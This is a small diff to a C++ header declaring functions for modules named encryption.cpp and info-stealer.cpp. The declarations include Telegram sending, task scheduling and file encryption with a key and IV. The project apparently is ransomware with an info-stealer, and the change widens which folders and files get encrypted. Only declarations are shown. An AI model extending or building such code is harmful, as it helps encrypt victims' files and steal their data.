@@ -44,8 +44,10 @@ void SendTelegram();
 void ScheduleTask();
 
 // encryption.cpp
-void GetAllFiles(const std::string& username);
-std::vector<std::string> GetFiles(const std::string& mainDir);
+bool isFileToEncrypt(const std::string& file);
+void GetAllFiles(const std::string& folderPath);
+std::vector<std::string> RetrieveFolders(int argc, char* argv[]);
+std::vector<std::string> GetFiles(const std::vector<std::string>& mainDirs);
 void EncryptFiles(const std::vector<std::string>& files, const std::string& key, const std::string& iv);
 
 // info-stealer.cpp
